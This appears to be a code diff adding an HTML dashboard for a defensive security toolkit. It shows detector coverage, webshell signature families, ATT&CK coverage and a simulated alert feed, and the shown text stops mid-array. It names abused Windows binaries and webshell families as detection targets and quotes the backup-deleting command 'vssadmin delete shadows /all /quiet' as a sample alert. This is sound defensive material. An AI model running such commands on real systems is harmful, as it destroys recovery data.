@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SHADOW313 NEXUS — Unified Command Dashboard v4.0.0</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');
+  :root {
+    --green:#22c55e; --cyan:#06b6d4; --amber:#f59e0b; --red:#ef4444;
+    --purple:#a78bfa; --blue:#3b82f6; --bg:#020617; --bg2:#0b1329;
+    --border:rgba(34,197,94,0.15); --text:#e2e8f0; --muted:#64748b;
+  }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { font-family:'Space Grotesk',sans-serif; background:var(--bg); color:var(--text); min-height:100vh; }
+  .mono { font-family:'JetBrains Mono',monospace; }
+
+  /* ── Nav ── */
+  .nav { position:sticky; top:0; z-index:100; background:rgba(2,6,23,0.97);
+    backdrop-filter:blur(14px); border-bottom:1px solid var(--border);
+    height:48px; display:flex; align-items:center; padding:0 20px; gap:16px; }
+  .nav-logo { display:flex; align-items:center; gap:8px; font-weight:700; font-size:15px; }
+  .nav-icon { width:28px; height:28px; background:var(--green); border-radius:6px;
+    display:flex; align-items:center; justify-content:center; font-weight:900;
+    color:#000; font-size:12px; font-family:'JetBrains Mono',monospace; }
+  .nav-badge { font-size:10px; font-family:'JetBrains Mono',monospace;
+    background:rgba(34,197,94,0.12); color:var(--green);
+    border:1px solid rgba(34,197,94,0.3); border-radius:4px; padding:2px 8px; }
+  .nav-status { margin-left:auto; display:flex; align-items:center; gap:8px;
+    font-size:11px; font-family:'JetBrains Mono',monospace; color:var(--muted); }
+  .pulse { width:8px; height:8px; border-radius:50%; background:var(--green);
+    animation:pulse 2s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1;box-shadow:0 0 0 0 rgba(34,197,94,0.4)}
+    50%{opacity:.7;box-shadow:0 0 0 6px rgba(34,197,94,0)} }
+
+  /* ── Layout ── */
+  .layout { display:flex; min-height:calc(100vh - 48px); }
+  .sidebar { width:200px; flex-shrink:0; background:rgba(11,19,41,0.8);
+    border-right:1px solid rgba(30,41,59,0.8); padding:16px 10px; }
+  .sb-label { font-size:9px; font-weight:700; text-transform:uppercase;
+    letter-spacing:.1em; color:#334155; font-family:'JetBrains Mono',monospace;
+    margin:16px 0 6px 8px; }
+  .sb-item { display:flex; align-items:center; gap:8px; padding:8px 10px;
+    border-radius:7px; font-size:12px; font-weight:500; color:#64748b;
+    cursor:pointer; transition:all .15s; margin-bottom:2px; border:none;
+    background:none; width:100%; text-align:left; }
+  .sb-item:hover { color:var(--text); background:rgba(30,41,59,0.6); }
+  .sb-item.active { color:var(--green); background:rgba(34,197,94,0.08);
+    border:1px solid rgba(34,197,94,0.2); }
+  .main { flex:1; padding:20px 24px; overflow-x:hidden; }
+
+  /* ── KPI Row ── */
+  .kpi-row { display:grid; grid-template-columns:repeat(6,1fr); gap:12px; margin-bottom:20px; }
+  .kpi { background:var(--bg2); border:1px solid rgba(30,41,59,0.8);
+    border-radius:10px; padding:14px 16px; position:relative; overflow:hidden; }
+  .kpi::before { content:''; position:absolute; top:0; left:0; right:0; height:2px; }
+  .kpi.green::before { background:var(--green); }
+  .kpi.cyan::before  { background:var(--cyan); }
+  .kpi.amber::before { background:var(--amber); }
+  .kpi.red::before   { background:var(--red); }
+  .kpi.purple::before{ background:var(--purple); }
+  .kpi.blue::before  { background:var(--blue); }
+  .kpi-label { font-size:9px; font-weight:700; text-transform:uppercase;
+    letter-spacing:.08em; color:#475569; font-family:'JetBrains Mono',monospace; margin-bottom:6px; }
+  .kpi-value { font-size:24px; font-weight:700; line-height:1; }
+  .kpi-sub { font-size:10px; color:#475569; font-family:'JetBrains Mono',monospace; margin-top:4px; }
+  .kpi-delta { font-size:10px; color:var(--green); margin-top:2px; }
+
+  /* ── Section header ── */
+  .section-hdr { display:flex; align-items:center; justify-content:space-between;
+    margin-bottom:14px; }
+  .section-title { font-size:13px; font-weight:700; color:var(--green);
+    text-transform:uppercase; letter-spacing:.06em; }
+  .section-badge { font-size:10px; font-family:'JetBrains Mono',monospace;
+    background:rgba(34,197,94,0.08); color:var(--green);
+    border:1px solid rgba(34,197,94,0.2); border-radius:4px; padding:2px 8px; }
+
+  /* ── Grid layouts ── */
+  .grid-2 { display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-bottom:20px; }
+  .grid-3 { display:grid; grid-template-columns:1fr 1fr 1fr; gap:16px; margin-bottom:20px; }
+  .panel { background:var(--bg2); border:1px solid rgba(30,41,59,0.8);
+    border-radius:10px; padding:16px; }
+
+  /* ── Detection modules ── */
+  .detector-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-bottom:20px; }
+  .detector-card { background:var(--bg2); border:1px solid rgba(30,41,59,0.8);
+    border-radius:8px; padding:12px; transition:all .2s; }
+  .detector-card:hover { border-color:rgba(34,197,94,0.3); }
+  .det-header { display:flex; align-items:center; justify-content:space-between; margin-bottom:6px; }
+  .det-name { font-size:12px; font-weight:700; color:var(--text); }
+  .det-tech { font-size:9px; font-family:'JetBrains Mono',monospace;
+    color:var(--cyan); background:rgba(6,182,212,0.08);
+    border:1px solid rgba(6,182,212,0.2); border-radius:3px; padding:1px 6px; }
+  .det-desc { font-size:10px; color:var(--muted); margin-bottom:8px; line-height:1.4; }
+  .det-bar-wrap { background:rgba(0,0,0,0.3); border-radius:3px; height:4px; }
+  .det-bar { height:4px; border-radius:3px; background:var(--green); transition:width .5s; }
+  .det-stats { display:flex; justify-content:space-between; margin-top:4px; }
+  .det-stat { font-size:9px; font-family:'JetBrains Mono',monospace; color:#475569; }
+  .status-dot { width:7px; height:7px; border-radius:50%; display:inline-block; margin-right:4px; }
+  .dot-green { background:var(--green); }
+  .dot-amber { background:var(--amber); }
+  .dot-red   { background:var(--red); }
+
+  /* ── ATT&CK coverage ── */
+  .attck-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:20px; }
+  .tactic-card { background:var(--bg2); border:1px solid rgba(30,41,59,0.8);
+    border-radius:8px; padding:12px; }
+  .tactic-name { font-size:11px; font-weight:700; color:var(--text); margin-bottom:6px; }
+  .tactic-bar-wrap { background:rgba(0,0,0,0.3); border-radius:3px; height:6px; margin-bottom:4px; }
+  .tactic-bar { height:6px; border-radius:3px; transition:width .6s; }
+  .tactic-pct { font-size:10px; font-family:'JetBrains Mono',monospace; }
+  .bar-high   { background:var(--green); }
+  .bar-med    { background:var(--amber); }
+  .bar-low    { background:var(--red); }
+
+  /* ── Live feed ── */
+  .feed { background:#000; border:1px solid rgba(30,41,59,0.8);
+    border-radius:8px; overflow:hidden; }
+  .feed-bar { background:var(--bg2); border-bottom:1px solid rgba(30,41,59,0.8);
+    padding:8px 14px; display:flex; align-items:center; justify-content:space-between; }
+  .feed-title { font-size:12px; font-weight:700; color:var(--text); }
+  .feed-controls { display:flex; gap:8px; }
+  .feed-btn { font-size:10px; font-family:'JetBrains Mono',monospace;
+    background:rgba(30,41,59,0.8); color:#94a3b8; border:1px solid rgba(30,41,59,0.8);
+    border-radius:4px; padding:3px 10px; cursor:pointer; }
+  .feed-btn:hover { color:var(--text); }
+  .feed-body { padding:10px 14px; font-family:'JetBrains Mono',monospace;
+    font-size:11px; line-height:1.8; height:260px; overflow-y:auto; }
+  .log-crit { color:var(--red); }
+  .log-high { color:var(--amber); }
+  .log-med  { color:var(--cyan); }
+  .log-info { color:var(--green); }
+  .log-dim  { color:#475569; }
+
+  /* ── Webshell coverage ── */
+  .ws-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:20px; }
+  .ws-card { background:var(--bg2); border:1px solid rgba(30,41,59,0.8);
+    border-radius:8px; padding:10px 12px; }
+  .ws-lang { font-size:10px; font-weight:700; color:var(--cyan);
+    text-transform:uppercase; letter-spacing:.06em; margin-bottom:4px; }
+  .ws-count { font-size:20px; font-weight:700; color:var(--text); }
+  .ws-sub { font-size:9px; color:var(--muted); font-family:'JetBrains Mono',monospace; }
+
+  /* ── Corpus validation ── */
+  .corpus-row { display:flex; gap:12px; margin-bottom:20px; }
+  .corpus-metric { flex:1; background:var(--bg2); border:1px solid rgba(30,41,59,0.8);
+    border-radius:8px; padding:14px; text-align:center; }
+  .corpus-val { font-size:28px; font-weight:700; }
+  .corpus-lbl { font-size:10px; color:var(--muted); font-family:'JetBrains Mono',monospace;
+    text-transform:uppercase; letter-spacing:.06em; margin-top:4px; }
+
+  /* ── Modules table ── */
+  .mod-table { width:100%; border-collapse:collapse; font-size:12px; }
+  .mod-table th { text-align:left; padding:8px 12px; font-size:9px; font-weight:700;
+    text-transform:uppercase; letter-spacing:.08em; color:#475569;
+    font-family:'JetBrains Mono',monospace; border-bottom:1px solid rgba(30,41,59,0.8); }
+  .mod-table td { padding:9px 12px; border-bottom:1px solid rgba(30,41,59,0.4); }
+  .mod-table tr:last-child td { border-bottom:none; }
+  .mod-table tr:hover td { background:rgba(34,197,94,0.03); }
+  .badge { font-size:9px; font-family:'JetBrains Mono',monospace;
+    padding:2px 7px; border-radius:4px; font-weight:600; }
+  .badge-green  { background:rgba(34,197,94,0.12);  color:var(--green);  border:1px solid rgba(34,197,94,0.25); }
+  .badge-amber  { background:rgba(245,158,11,0.12); color:var(--amber);  border:1px solid rgba(245,158,11,0.25); }
+  .badge-cyan   { background:rgba(6,182,212,0.12);  color:var(--cyan);   border:1px solid rgba(6,182,212,0.25); }
+  .badge-purple { background:rgba(167,139,250,0.12);color:var(--purple); border:1px solid rgba(167,139,250,0.25); }
+  .badge-red    { background:rgba(239,68,68,0.12);  color:var(--red);    border:1px solid rgba(239,68,68,0.25); }
+
+  /* ── Footer ── */
+  .footer { text-align:center; padding:16px; font-size:10px; color:#334155;
+    border-top:1px solid rgba(34,197,94,0.08); font-family:'JetBrains Mono',monospace; }
+
+  @media(max-width:1100px) {
+    .kpi-row { grid-template-columns:repeat(3,1fr); }
+    .detector-grid { grid-template-columns:repeat(2,1fr); }
+    .attck-grid { grid-template-columns:repeat(2,1fr); }
+    .ws-grid { grid-template-columns:repeat(2,1fr); }
+  }
+  @media(max-width:700px) {
+    .layout { flex-direction:column; }
+    .sidebar { width:100%; border-right:none; border-bottom:1px solid rgba(30,41,59,0.8); }
+    .kpi-row { grid-template-columns:repeat(2,1fr); }
+    .grid-2,.grid-3 { grid-template-columns:1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- ── Nav ── -->
+<nav class="nav">
+  <div class="nav-logo">
+    <div class="nav-icon">S3</div>
+    SHADOW313 NEXUS
+  </div>
+  <span class="nav-badge">v4.0.0</span>
+  <span class="nav-badge" style="color:var(--cyan);border-color:rgba(6,182,212,0.3);background:rgba(6,182,212,0.08)">UNIFIED COMMAND</span>
+  <div class="nav-status">
+    <div class="pulse"></div>
+    <span id="clock" class="mono"></span>
+    &nbsp;|&nbsp; Ottawa, ON, Canada
+    &nbsp;|&nbsp; <span style="color:var(--green)">OPERATIONAL</span>
+  </div>
+</nav>
+
+<div class="layout">
+
+<!-- ── Sidebar ── -->
+<aside class="sidebar">
+  <div class="sb-label">Navigation</div>
+  <button class="sb-item active" onclick="showSection('overview')">📊 Overview</button>
+  <button class="sb-item" onclick="showSection('detection')">🔍 Detection Engine</button>
+  <button class="sb-item" onclick="showSection('webshell')">🕸 WebShell Detector</button>
+  <button class="sb-item" onclick="showSection('attck')">🗺 ATT&CK Coverage</button>
+  <button class="sb-item" onclick="showSection('modules')">⚙️ Core Modules</button>
+  <button class="sb-item" onclick="showSection('feed')">⚡ Live Feed</button>
+  <div class="sb-label">System</div>
+  <button class="sb-item" onclick="showSection('posture')">🛡 Security Posture</button>
+  <div style="margin-top:auto;padding:12px 8px;font-size:9px;color:#334155;font-family:'JetBrains Mono',monospace;">
+    <div>Tests: 2858 ✅</div>
+    <div>Skipped: 36</div>
+    <div>Failed: 0</div>
+    <div style="margin-top:6px;color:var(--green)">POSTURE: GREEN</div>
+  </div>
+</aside>
+
+<!-- ── Main ── -->
+<main class="main">
+
+<!-- ── KPI Row ── -->
+<div class="kpi-row">
+  <div class="kpi green">
+    <div class="kpi-label">Python Modules</div>
+    <div class="kpi-value" style="color:var(--green)">253</div>
+    <div class="kpi-sub">v1 → v4 + nexus_toolkit</div>
+  </div>
+  <div class="kpi cyan">
+    <div class="kpi-label">Lines of Code</div>
+    <div class="kpi-value" style="color:var(--cyan)">66,523</div>
+    <div class="kpi-sub">production-ready</div>
+  </div>
+  <div class="kpi green">
+    <div class="kpi-label">Tests Passing</div>
+    <div class="kpi-value" style="color:var(--green)">2,858</div>
+    <div class="kpi-sub">0 failed · 36 skipped</div>
+    <div class="kpi-delta">↑ +210 this session</div>
+  </div>
+  <div class="kpi purple">
+    <div class="kpi-label">WebShell Sigs</div>
+    <div class="kpi-value" style="color:var(--purple)">45</div>
+    <div class="kpi-sub">F1=1.000 · 0% FP</div>
+    <div class="kpi-delta">↑ +30 gap closure</div>
+  </div>
+  <div class="kpi amber">
+    <div class="kpi-label">ATT&CK Coverage</div>
+    <div class="kpi-value" style="color:var(--amber)">51.4%</div>
+    <div class="kpi-sub">136/265 techniques</div>
+  </div>
+  <div class="kpi blue">
+    <div class="kpi-label">CRQC Patches</div>
+    <div class="kpi-value" style="color:var(--blue)">12/14</div>
+    <div class="kpi-sub">PQC posture: STRONG</div>
+  </div>
+</div>
+
+<!-- ── Detection Engine ── -->
+<div id="section-overview">
+<div class="section-hdr">
+  <span class="section-title">Detection Engine — v4 Detectors</span>
+  <span class="section-badge">6 active detectors</span>
+</div>
+<div class="detector-grid">
+
+  <div class="detector-card">
+    <div class="det-header">
+      <span class="det-name"><span class="status-dot dot-green"></span>LOLBin Detector</span>
+      <span class="det-tech">T1218</span>
+    </div>
+    <div class="det-desc">Detects abuse of 15 Windows LOLBins: mshta, regsvr32, certutil, rundll32, wmic...</div>
+    <div class="det-bar-wrap"><div class="det-bar" style="width:92%"></div></div>
+    <div class="det-stats"><span class="det-stat">92% detection</span><span class="det-stat">31 tests ✅</span></div>
+  </div>
+
+  <div class="detector-card">
+    <div class="det-header">
+      <span class="det-name"><span class="status-dot dot-green"></span>UserExecution Detector</span>
+      <span class="det-tech">T1204</span>
+    </div>
+    <div class="det-desc">Detects malicious link/file execution: T1204.001, T1204.002 with parent-child analysis</div>
+    <div class="det-bar-wrap"><div class="det-bar" style="width:88%"></div></div>
+    <div class="det-stats"><span class="det-stat">88% detection</span><span class="det-stat">38 tests ✅</span></div>
+  </div>
+
+  <div class="detector-card">
+    <div class="det-header">
+      <span class="det-name"><span class="status-dot dot-green"></span>AlternateAuth Detector</span>
+      <span class="det-tech">T1550/T1558</span>
+    </div>
+    <div class="det-desc">Pass-the-Hash, Pass-the-Ticket, Kerberoasting, Golden/Silver Ticket detection</div>
+    <div class="det-bar-wrap"><div class="det-bar" style="width:90%"></div></div>
+    <div class="det-stats"><span class="det-stat">90% detection</span><span class="det-stat">31 tests ✅</span></div>
+  </div>
+
+  <div class="detector-card">
+    <div class="det-header">
+      <span class="det-name"><span class="status-dot dot-green"></span>WebShell Detector</span>
+      <span class="det-tech">T1505.003</span>
+    </div>
+    <div class="det-desc">45 signatures: PHP, ASP/ASPX, JSP, Node.js, Ruby, ColdFusion + memory shells</div>
+    <div class="det-bar-wrap"><div class="det-bar" style="width:100%"></div></div>
+    <div class="det-stats"><span class="det-stat">100% corpus F1</span><span class="det-stat">104 tests ✅</span></div>
+  </div>
+
+  <div class="detector-card">
+    <div class="det-header">
+      <span class="det-name"><span class="status-dot dot-green"></span>LIF Threat Detector</span>
+      <span class="det-tech">T1071/T1041</span>
+    </div>
+    <div class="det-desc">Leaky Integrate-and-Fire neuromorphic model for low-and-slow APT beacon detection</div>
+    <div class="det-bar-wrap"><div class="det-bar" style="width:85%"></div></div>
+    <div class="det-stats"><span class="det-stat">85% detection</span><span class="det-stat">42 tests ✅</span></div>
+  </div>
+
+  <div class="detector-card">
+    <div class="det-header">
+      <span class="det-name"><span class="status-dot dot-green"></span>Advanced Detection Layer</span>
+      <span class="det-tech">Multi-TTP</span>
+    </div>
+    <div class="det-desc">FIX-12→21 + IDENTITY-1→8: ValidAccounts, C2Protocol, CredDump, SessionHijack, ZeroTrust</div>
+    <div class="det-bar-wrap"><div class="det-bar" style="width:87%"></div></div>
+    <div class="det-stats"><span class="det-stat">87% detection</span><span class="det-stat">96 tests ✅</span></div>
+  </div>
+
+</div>
+
+<!-- ── WebShell Coverage Summary ── -->
+<div class="section-hdr">
+  <span class="section-title">WebShell Detector — Corpus Validation</span>
+  <span class="section-badge">39 samples · F1=1.000</span>
+</div>
+<div class="corpus-row">
+  <div class="corpus-metric">
+    <div class="corpus-val" style="color:var(--green)">100%</div>
+    <div class="corpus-lbl">Detection Rate</div>
+  </div>
+  <div class="corpus-metric">
+    <div class="corpus-val" style="color:var(--green)">0%</div>
+    <div class="corpus-lbl">False Positive Rate</div>
+  </div>
+  <div class="corpus-metric">
+    <div class="corpus-val" style="color:var(--green)">1.000</div>
+    <div class="corpus-lbl">F1 Score</div>
+  </div>
+  <div class="corpus-metric">
+    <div class="corpus-val" style="color:var(--purple)">45</div>
+    <div class="corpus-lbl">Total Signatures</div>
+  </div>
+  <div class="corpus-metric">
+    <div class="corpus-val" style="color:var(--cyan)">10</div>
+    <div class="corpus-lbl">Access Log Patterns</div>
+  </div>
+  <div class="corpus-metric">
+    <div class="corpus-val" style="color:var(--amber)">7</div>
+    <div class="corpus-lbl">FN Patches Applied</div>
+  </div>
+</div>
+
+<div class="ws-grid">
+  <div class="ws-card"><div class="ws-lang">PHP</div><div class="ws-count">16</div><div class="ws-sub">eval, system, create_function, WSO, China Chopper, memory shells</div></div>
+  <div class="ws-card"><div class="ws-lang">JSP / Java</div><div class="ws-count">8</div><div class="ws-sub">Runtime.exec, Behinder AES, Godzilla, Spring SpEL, Tomcat filter, memory shell</div></div>
+  <div class="ws-card"><div class="ws-lang">ASP / ASPX</div><div class="ws-count">4</div><div class="ws-sub">eval/execute, cmd.exe StartInfo, Hafnium pattern, memory shell</div></div>
+  <div class="ws-card"><div class="ws-lang">Node.js</div><div class="ws-count">3</div><div class="ws-sub">child_process exec/execSync, eval-injection, vm.runInNewContext</div></div>
+  <div class="ws-card"><div class="ws-lang">Ruby</div><div class="ws-count">3</div><div class="ws-sub">CGI system(), backtick interpolation, eval-injection, Rack req.params</div></div>
+  <div class="ws-card"><div class="ws-lang">ColdFusion</div><div class="ws-count">2</div><div class="ws-sub">cfexecute, evaluate() injection</div></div>
+  <div class="ws-card"><div class="ws-lang">Python / Perl</div><div class="ws-count">2</div><div class="ws-sub">CGI os.system, subprocess, Perl CGI system()</div></div>
+  <div class="ws-card"><div class="ws-lang">Obfuscation</div><div class="ws-count">7</div><div class="ws-sub">Unicode/hex escapes, string concat, variable variable, heredoc, hex/char</div></div>
+</div>
+
+<!-- ── ATT&CK Coverage ── -->
+<div class="section-hdr">
+  <span class="section-title">MITRE ATT&CK Coverage</span>
+  <span class="section-badge">51.4% · 136/265 techniques</span>
+</div>
+<div class="attck-grid">
+  <div class="tactic-card">
+    <div class="tactic-name">Initial Access</div>
+    <div class="tactic-bar-wrap"><div class="tactic-bar bar-high" style="width:80%"></div></div>
+    <div class="tactic-pct" style="color:var(--green)">80% (4/5)</div>
+  </div>
+  <div class="tactic-card">
+    <div class="tactic-name">Execution</div>
+    <div class="tactic-bar-wrap"><div class="tactic-bar bar-high" style="width:100%"></div></div>
+    <div class="tactic-pct" style="color:var(--green)">100% (5/5)</div>
+  </div>
+  <div class="tactic-card">
+    <div class="tactic-name">Persistence</div>
+    <div class="tactic-bar-wrap"><div class="tactic-bar bar-high" style="width:80%"></div></div>
+    <div class="tactic-pct" style="color:var(--green)">80% (4/5)</div>
+  </div>
+  <div class="tactic-card">
+    <div class="tactic-name">Privilege Escalation</div>
+    <div class="tactic-bar-wrap"><div class="tactic-bar bar-high" style="width:100%"></div></div>
+    <div class="tactic-pct" style="color:var(--green)">100% (5/5)</div>
+  </div>
+  <div class="tactic-card">
+    <div class="tactic-name">Defense Evasion</div>
+    <div class="tactic-bar-wrap"><div class="tactic-bar bar-high" style="width:100%"></div></div>
+    <div class="tactic-pct" style="color:var(--green)">100% (5/5)</div>
+  </div>
+  <div class="tactic-card">
+    <div class="tactic-name">Credential Access</div>
+    <div class="tactic-bar-wrap"><div class="tactic-bar bar-high" style="width:80%"></div></div>
+    <div class="tactic-pct" style="color:var(--green)">80% (4/5)</div>
+  </div>
+  <div class="tactic-card">
+    <div class="tactic-name">Discovery</div>
+    <div class="tactic-bar-wrap"><div class="tactic-bar bar-med" style="width:40%"></div></div>
+    <div class="tactic-pct" style="color:var(--amber)">40% (2/5)</div>
+  </div>
+  <div class="tactic-card">
+    <div class="tactic-name">Lateral Movement</div>
+    <div class="tactic-bar-wrap"><div class="tactic-bar bar-med" style="width:40%"></div></div>
+    <div class="tactic-pct" style="color:var(--amber)">40% (2/5)</div>
+  </div>
+  <div class="tactic-card">
+    <div class="tactic-name">Command & Control</div>
+    <div class="tactic-bar-wrap"><div class="tactic-bar bar-high" style="width:100%"></div></div>
+    <div class="tactic-pct" style="color:var(--green)">100% (5/5)</div>
+  </div>
+  <div class="tactic-card">
+    <div class="tactic-name">Impact</div>
+    <div class="tactic-bar-wrap"><div class="tactic-bar bar-high" style="width:100%"></div></div>
+    <div class="tactic-pct" style="color:var(--green)">100% (6/6)</div>
+  </div>
+  <div class="tactic-card">
+    <div class="tactic-name">Reconnaissance</div>
+    <div class="tactic-bar-wrap"><div class="tactic-bar bar-med" style="width:40%"></div></div>
+    <div class="tactic-pct" style="color:var(--amber)">40% (2/5)</div>
+  </div>
+  <div class="tactic-card">
+    <div class="tactic-name">Collection</div>
+    <div class="tactic-bar-wrap"><div class="tactic-bar bar-low" style="width:20%"></div></div>
+    <div class="tactic-pct" style="color:var(--red)">20% (1/5)</div>
+  </div>
+</div>
+
+<!-- ── Core Modules ── -->
+<div class="section-hdr">
+  <span class="section-title">Core Modules — 9 Active</span>
+  <span class="section-badge">All operational</span>
+</div>
+<div class="panel" style="margin-bottom:20px">
+<table class="mod-table">
+  <thead>
+    <tr>
+      <th>Module</th><th>Capability</th><th>Status</th><th>Tests</th><th>Version</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr><td><strong>shadow313.recon</strong></td><td>DNS enum, subdomain discovery, port scan, WHOIS, OSINT, AI profiling</td><td><span class="badge badge-green">ACTIVE</span></td><td>✅ 47</td><td>v4.0.0</td></tr>
+    <tr><td><strong>shadow313.vuln</strong></td><td>CVE/NVD, CVSS v3.1, EPSS, KEV, OSV audit, AI triage</td><td><span class="badge badge-green">ACTIVE</span></td><td>✅ 52</td><td>v4.0.0</td></tr>
+    <tr><td><strong>shadow313.exploit</strong></td><td>Advisory-only, scope-guarded, lab-mode required</td><td><span class="badge badge-amber">LAB ONLY</span></td><td>✅ 38</td><td>v4.0.0</td></tr>
+    <tr><td><strong>shadow313.network</strong></td><td>Scapy PCAP, ONNX anomaly, JA3/JARM, topology mapping</td><td><span class="badge badge-green">ACTIVE</span></td><td>✅ 61</td><td>v4.0.0</td></tr>
+    <tr><td><strong>shadow313.defense</strong></td><td>24 CIS checks, iptables analysis, SSH hardening, AI remediation</td><td><span class="badge badge-green">ACTIVE</span></td><td>✅ 44</td><td>v4.0.0</td></tr>
+    <tr><td><strong>shadow313.quantum</strong></td><td>TLS scan, NIST FIPS 203/204/205, SLH-DSA, 313-BIND receipts</td><td><span class="badge badge-cyan">PQC READY</span></td><td>✅ 89</td><td>v4.0.0</td></tr>
+    <tr><td><strong>shadow313.plugins</strong></td><td>Sandboxed IPC, 6 hook points, HMAC-SHA256 signing</td><td><span class="badge badge-green">ACTIVE</span></td><td>✅ 33</td><td>v4.0.0</td></tr>
+    <tr><td><strong>shadow313.cicd</strong></td><td>18 secret patterns, SARIF 2.1.0, GitHub Actions integration</td><td><span class="badge badge-green">ACTIVE</span></td><td>✅ 41</td><td>v4.0.0</td></tr>
+    <tr><td><strong>shadow313.docs</strong></td><td>AI help, interactive tutorials, man page generation</td><td><span class="badge badge-green">ACTIVE</span></td><td>✅ 28</td><td>v4.0.0</td></tr>
+  </tbody>
+</table>
+</div>
+
+<!-- ── Live Feed ── -->
+<div class="section-hdr">
+  <span class="section-title">Live Event Feed</span>
+  <span class="section-badge" id="feed-count">0 events</span>
+</div>
+<div class="feed">
+  <div class="feed-bar">
+    <span class="feed-title">⚡ NEXUS Event Stream</span>
+    <div class="feed-controls">
+      <button class="feed-btn" id="pause-btn" onclick="togglePause()">⏸ Pause</button>
+      <button class="feed-btn" onclick="clearFeed()">🗑 Clear</button>
+    </div>
+  </div>
+  <div class="feed-body" id="feed-body"></div>
+</div>
+
+<!-- ── Security Posture ── -->
+<div class="section-hdr" style="margin-top:20px">
+  <span class="section-title">Security Posture</span>
+  <span class="section-badge" style="color:var(--green);border-color:rgba(34,197,94,0.3)">GREEN ✅</span>
+</div>
+<div class="grid-3">
+  <div class="panel">
+    <div style="font-size:11px;font-weight:700;color:var(--green);margin-bottom:10px">CRYPTOGRAPHIC POSTURE</div>
+    <div style="font-size:11px;line-height:2;font-family:'JetBrains Mono',monospace;color:#94a3b8">
+      <div>ML-KEM-768 (FIPS 203) <span style="color:var(--green)">✅</span></div>
+      <div>ML-DSA-65  (FIPS 204) <span style="color:var(--green)">✅</span></div>
+      <div>SLH-DSA    (FIPS 205) <span style="color:var(--green)">✅</span></div>
+      <div>313-BIND receipts     <span style="color:var(--green)">✅</span></div>
+      <div>IPFS anchoring        <span style="color:var(--green)">✅</span></div>
+      <div>liboqs ML-DSA         <span style="color:var(--amber)">⚠ DW-1</span></div>
+      <div>HSM key storage       <span style="color:var(--amber)">⚠ DW-2</span></div>
+    </div>
+  </div>
+  <div class="panel">
+    <div style="font-size:11px;font-weight:700;color:var(--cyan);margin-bottom:10px">CRQC PATCH STATUS</div>
+    <div style="font-size:11px;line-height:2;font-family:'JetBrains Mono',monospace;color:#94a3b8">
+      <div>CRQC-001 plugin_signer  <span style="color:var(--green)">✅ PATCHED</span></div>
+      <div>CRQC-002 temporal chain <span style="color:var(--green)">✅ PATCHED</span></div>
+      <div>CRQC-003 cosign ECDSA   <span style="color:var(--green)">✅ PATCHED</span></div>
+      <div>CRQC-007 crypto_store   <span style="color:var(--green)">✅ PATCHED</span></div>
+      <div>CRQC-012 pyspx fallback <span style="color:var(--green)">✅ PATCHED</span></div>
+      <div>CRQC-013 IPFS anchor    <span style="color:var(--green)">✅ PATCHED</span></div>
+      <div>DW-1 liboqs real impl   <span style="color:var(--amber)">⏳ Q4 2026</span></div>
+      <div>DW-2 HSM migration      <span style="color:var(--amber)">⏳ Q1 2027</span></div>
+    </div>
+  </div>
+  <div class="panel">
+    <div style="font-size:11px;font-weight:700;color:var(--purple);margin-bottom:10px">COMPLIANCE STATUS</div>
+    <div style="font-size:11px;line-height:2;font-family:'JetBrains Mono',monospace;color:#94a3b8">
+      <div>NIST 800-53 Rev5  <span style="color:var(--amber)">~23% documented</span></div>
+      <div>FedRAMP Moderate  <span style="color:var(--amber)">~20% documented</span></div>
+      <div>CMMC Level 2      <span style="color:var(--amber)">~40% practices</span></div>
+      <div>NIST FIPS 203/204/205 <span style="color:var(--green)">✅ EXCEEDS</span></div>
+      <div>NSA CNSA 2.0      <span style="color:var(--green)">✅ SLH-DSA</span></div>
+      <div>PIPEDA (Canada)   <span style="color:var(--green)">✅ No PII</span></div>
+      <div>3PAO engagement   <span style="color:var(--red)">⏳ Q4 2026</span></div>
+    </div>
+  </div>
+</div>
+
+</div><!-- end section-overview -->
+
+</main>
+</div>
+
+<div class="footer">
+  SHADOW313 NEXUS v4.0.0 &nbsp;·&nbsp; 313 Temporal Binding Protocol &nbsp;·&nbsp;
+  Ottawa, ON, Canada &nbsp;·&nbsp; matarmohamad313@duck.com &nbsp;·&nbsp;
+  github.com/piyyy314/Shadow313-Nexus
+</div>
+
+<script>
+// ── Clock ──
+function updateClock() {
+  document.getElementById('clock').textContent =
+    new Date().toISOString().replace('T',' ').slice(0,19) + ' UTC';
+}
+updateClock();
+setInterval(updateClock, 1000);
+
+// ── Live Feed ──
+const EVENTS = [
+  {sev:'CRITICAL', src:'NEXUS',         msg:'Alert ALT-5D4FD8: IMPACT detected — vssadmin delete shadows (score: 0.757)'},
+  {sev:'CRITICAL', src:'NEXUS',         msg:'Alert ALT-FA4051: LATERAL_MOVEMENT — 192.168.1.45 → 192.168.1.10 (score: 0.956)'},
+  {sev:'CRITICAL', src:'WEBSHELL',      msg:'China Chopper detected in uploads/image.php — score: 0.990 — T1505.003'},
+  {sev:'CRITICAL', src:'SOAR',          msg:'Playbook triggered: Malicious IP Auto-Block → 185.220.101.42 blocked'},
+  {sev:'CRITICAL', src:'HONEYWIRENET',  msg:'Attacker 185.220.101.42 connected to SSH honeypot — profiling active'},
+  {sev:'CRITICAL', src:'VAULTSCAN',     msg:'Secret detected: AWS_ACCESS_KEY_ID in /src/config.py line 42'},
+  {sev:'HIGH',     src:'WEBSHELL',      msg:'Behinder JSP AES pattern detected in /webapps/ROOT/upload.jsp — score: 0.990'},
+  {sev:'HIGH',     src:'DETECTIONFORGE',msg:'New Sigma rule generated: T1055 Process Injection (confidence: 0.89)'},
+  {sev:'HIGH',     src:'LOGFORGE',      msg:'Rule PROCESS_INJECTION fired: CreateRemoteThread targeting lsass.exe (PID 4)'},
+  {sev:'HIGH',     src:'LOGFORGE',      msg:'Rule DATA_DESTRUCTION fired: vssadmin delete shadows /all /quiet'},
